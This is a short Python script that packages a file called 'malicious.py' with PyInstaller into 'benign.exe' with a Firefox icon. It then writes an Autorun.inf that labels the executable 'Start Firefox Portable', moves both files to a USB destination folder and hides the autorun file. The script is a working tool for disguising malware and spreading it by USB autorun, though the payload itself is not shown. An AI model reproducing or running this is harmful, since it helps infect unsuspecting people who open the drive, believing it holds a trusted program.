import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
# pwd = "X:"
# usbdir = os.path.join(pwd, "USB")
pwd = "."
usbdir = os.path.join(pwd, "destination")

if os.path.isfile(exename):
    os.remove(exename)

PyInstaller.__main__.run(
    [
        "malicious.py",
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        f"--name={exename}",
        f"--icon={icon}",
    ]
)

shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(f"{exename}.spec")

with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write(f"Open={exename}\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write(f"Icon={exename}\n")  # exename? not icon?

shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system(f'attrib +h "{os.path.join(usbdir, "Autorun.inf")}"')
